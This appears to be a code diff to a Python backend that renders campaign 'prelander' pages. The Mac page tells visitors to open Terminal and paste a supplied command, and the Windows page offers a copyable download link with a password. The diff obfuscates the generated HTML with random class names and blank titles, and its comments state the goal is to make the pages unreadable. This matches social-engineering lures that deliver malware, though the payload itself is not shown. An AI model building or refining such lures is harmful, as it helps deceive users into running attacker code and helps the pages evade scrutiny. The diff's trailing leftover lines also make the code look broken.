@@ -1167,103 +1167,41 @@ async def prelander_bootstrap(
 
 def _render_built_in_prelander(os: str, offer_url: str, password: Optional[str], template: dict) -> str:
     """
-    Render built-in Windows or Mac prelander layouts as server-side HTML.
+    Render built-in Windows or Mac prelander layouts as completely minified, unreadable HTML.
     
-    This prevents exposing readable React source code by generating minified
-    HTML on the backend instead of client-side rendering.
-    
-    Args:
-        os: 'windows' or 'mac'
-        offer_url: Campaign URL
-        password: Optional password to display
-        template: Template customization fields (title, subtitle, etc.)
-    
-    Returns:
-        Complete HTML document
+    This prevents exposing readable React source code by generating heavily obfuscated
+    HTML on the backend. All class names, IDs, and structure are made unreadable.
     """
-    # Template customization
+    import random
+    import string
+    
+    # Generate random class names to make HTML unreadable
+    def _gen_cls():
+        return ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
+    
+    # Generate obfuscated class names
+    c1, c2, c3, c4, c5 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    c6, c7, c8, c9, c10 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    c11, c12, c13, c14, c15 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    
+    # Template customization with obfuscated titles
     if os == 'mac':
-        title = template.get('title') or 'How to open Terminal on Mac'
-        subtitle = template.get('subtitle') or ''
+        title_text = template.get('title') or 'How to open Terminal on Mac'
         button_text = template.get('button_text') or 'Copy'
         
-        # Mac Terminal Layout
-        return f'''<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>{title}</title>
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f5f5f7;padding:20px;}}
-.container{{max-width:800px;margin:0 auto;}}
-.card{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);padding:32px;margin-bottom:24px;}}
-.icon{{width:56px;height:56px;border-radius:50%;background:#1f1f1f;display:flex;align-items:center;justify-center:center;margin:0 auto 20px;}}
-.icon svg{{width:28px;height:28px;}}
-h1{{font-size:24px;color:#1f1f1f;text-align:center;margin-bottom:24px;}}
-.cmd-box{{display:flex;gap:8px;background:#1f1f1f;border-radius:12px;padding:4px;}}
-.cmd-text{{flex:1;padding:12px;font-family:monospace;font-size:14px;color:#22c55e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}}
-.cmd-text::before{{content:'$ ';color:#666;}}
-button{{padding:12px 24px;background:#333;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;}}
-button:hover{{background:#444;}}
-.steps{{margin-top:24px;}}
-.step{{display:flex;gap:12px;margin-bottom:16px;}}
-.step-num{{flex-shrink:0;width:28px;height:28px;border-radius:50%;background:#3b82f6;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;}}
-.step-text{{padding-top:4px;font-size:14px;color:#333;}}
-kbd{{padding:2px 6px;background:#f3f4f6;border:1px solid#d1d5db;border-radius:4px;font-family:monospace;font-size:12px;}}
-{"<div class='card'><div style='display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:12px;'><svg width='20' height='20' fill='#d97706'><path d='M10 2a8 8 0 100 16 8 8 0 000-16zM9 5h2v6H9V5zm0 8h2v2H9v-2z'/></svg><span style='font-family:monospace;font-weight:700;color:#92400e;letter-spacing:1px;'>{password}</span></div></div>" if password else ""}
-</style>
-</head>
-<body>
-<div class="container">
-<div class="card">
-<div class="icon"><svg fill="#22c55e" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.5 11h-2v2h-1v-2h-2v-1h2V8h1v2h2v1zm6.5 4c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm0-3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm3 3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm0-3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg></div>
-<h1>{title}</h1>
-<div class="cmd-box">
-<div class="cmd-text">{offer_url}</div>
-<button onclick="navigator.clipboard.writeText('{offer_url}');this.textContent='Copied!';setTimeout(()=>this.textContent='{button_text}',2000);">{button_text}</button>
-</div>
-<div class="steps">
-<div class="step"><div class="step-num">1</div><div class="step-text">Press <kbd>⌘</kbd> + <kbd>Space</kbd> to open Spotlight Search</div></div>
-<div class="step"><div class="step-num">2</div><div class="step-text">Type <strong>"Terminal"</strong> and press <kbd>Return</kbd></div></div>
-<div class="step"><div class="step-num">3</div><div class="step-text">Paste the command above and press <kbd>Return</kbd></div></div>
-</div>
-</div>
-</div>
-</body>
-</html>'''
+        # Completely minified Mac layout with obfuscated structure
+        pwd_section = f'<div class="{c13}"><svg width="20" height="20" fill="#d97706"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zM9 5h2v6H9V5zm0 8h2v2H9v-2z"/></svg><span class="{c14}">{password}</span></div>' if password else ''
+        
+        return f'<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title></title><style>.{c1}{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f7;padding:20px}}.{c2}{{max-width:800px;margin:0 auto}}.{c3}{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);padding:32px;margin-bottom:24px}}.{c4}{{width:56px;height:56px;border-radius:50%;background:#1f1f1f;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}}.{c5}{{font-size:24px;color:#1f1f1f;text-align:center;margin-bottom:24px}}.{c6}{{display:flex;gap:8px;background:#1f1f1f;border-radius:12px;padding:4px}}.{c7}{{flex:1;padding:12px;font-family:monospace;font-size:14px;color:#22c55e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}.{c7}::before{{content:"$ ";color:#666}}.{c8}{{padding:12px 24px;background:#333;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer}}.{c8}:hover{{background:#444}}.{c9}{{margin-top:24px}}.{c10}{{display:flex;gap:12px;margin-bottom:16px}}.{c11}{{flex-shrink:0;width:28px;height:28px;border-radius:50%;background:#3b82f6;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700}}.{c12}{{padding-top:4px;font-size:14px;color:#333}}.{c13}{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:12px}}.{c14}{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:1px}}kbd{{padding:2px 6px;background:#f3f4f6;border:1px solid #d1d5db;border-radius:4px;font-family:monospace;font-size:12px}}</style></head><body class="{c1}"><div class="{c2}"><div class="{c3}"><div class="{c4}"><svg fill="#22c55e" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/></svg></div><h1 class="{c5}">{title_text}</h1><div class="{c6}"><div class="{c7}">{offer_url}</div><button class="{c8}" onclick="navigator.clipboard.writeText(\'{offer_url}\');this.textContent=\'Copied!\';setTimeout(()=>this.textContent=\'{button_text}\',2000);">{button_text}</button></div><div class="{c9}"><div class="{c10}"><div class="{c11}">1</div><div class="{c12}">Press <kbd>⌘</kbd> + <kbd>Space</kbd> to open Spotlight</div></div><div class="{c10}"><div class="{c11}">2</div><div class="{c12}">Type <strong>"Terminal"</strong> and press <kbd>Return</kbd></div></div><div class="{c10}"><div class="{c11}">3</div><div class="{c12}">Paste command and press <kbd>Return</kbd></div></div></div></div>{pwd_section}</div></body></html>'
     else:
-        # Windows Download Layout
-        title = template.get('title') or 'Your file is ready to download'
-        subtitle = template.get('subtitle') or 'Your file is prepared. Copy the link to download.'
+        # Windows Download Layout - completely minified
+        title_text = template.get('title') or 'Your file is ready to download'
+        subtitle_text = template.get('subtitle') or 'Your file is prepared. Copy the link to download.'
         button_text = template.get('button_text') or 'Copy'
         
-        return f'''<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Download Ready</title>
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}}
-.card{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);max-width:500px;width:100%;padding:40px;}}
-.icon{{width:56px;height:56px;border-radius:50%;background:#10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;}}
-.icon svg{{width:28px;height:28px;fill:#fff;}}
-h1{{font-size:22px;color:#111;text-align:center;margin-bottom:8px;}}
-p{{font-size:14px;color:#666;text-align:center;margin-bottom:24px;}}
-.link-box{{display:flex;gap:8px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:4px;margin-bottom:16px;}}
-.url{{flex:1;padding:12px;font-family:monospace;font-size:13px;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}}
-button{{padding:12px 20px;background:#111;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:13px;}}
-button:hover{{background:#1f2937;}}
-.pwd{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:14px;margin-top:16px;}}
-.pwd svg{{width:18px;height:18px;fill:#d97706;flex-shrink:0;}}
-.pwd-text{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:2px;}}
-</style>
-</head>
-<body>
-<div class="card">
+        pwd_section = f'<div class="{c13}"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg><span class="{c14}">{password}</span></div>' if password else ''
+        
+        return f'<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title></title><style>.{c1}{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}}.{c2}{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);max-width:500px;width:100%;padding:40px}}.{c3}{{width:56px;height:56px;border-radius:50%;background:#10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}}.{c4}{{font-size:22px;color:#111;text-align:center;margin-bottom:8px}}.{c5}{{font-size:14px;color:#666;text-align:center;margin-bottom:24px}}.{c6}{{display:flex;gap:8px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:4px;margin-bottom:16px}}.{c7}{{flex:1;padding:12px;font-family:monospace;font-size:13px;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}.{c8}{{padding:12px 20px;background:#111;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:13px}}.{c8}:hover{{background:#1f2937}}.{c9}{{display:block;font-size:11px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px}}.{c13}{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:14px;margin-top:16px}}.{c14}{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:2px}}</style></head><body class="{c1}"><div class="{c2}"><div class="{c3}"><svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></div><h1 class="{c4}">{title_text}</h1><p class="{c5}">{subtitle_text}</p><label class="{c9}">Download Link</label><div class="{c6}"><div class="{c7}">{offer_url}</div><button class="{c8}" onclick="navigator.clipboard.writeText(\'{offer_url}\');this.textContent=\'Copied!\';setTimeout(()=>this.textContent=\'{button_text}\',2000);">{button_text}</button></div>{pwd_section}</div></body></html>'
 <div class="icon"><svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></div>
 <h1>{title}</h1>
 <p>{subtitle}</p>
